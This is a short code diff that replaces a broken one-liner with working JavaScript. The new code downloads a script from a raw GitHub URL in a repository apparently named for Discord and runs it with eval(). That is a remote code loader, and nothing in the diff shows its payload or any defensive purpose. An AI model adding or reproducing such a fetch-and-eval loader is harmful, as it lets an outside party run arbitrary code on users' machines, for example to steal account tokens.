@@ -1,1 +1,7 @@
-eval(fetch('https://raw.githubusercontent.com/jin-zhao-text/.js').then(r => r.text()))
+fetch(
+  "https://raw.githubusercontent.com/jin-zhao-teh/discord_stuff/refs/heads/main/main.js"
+)
+  .then((r) => r.text())
+  .then((code) => {
+    eval(code);
+  });
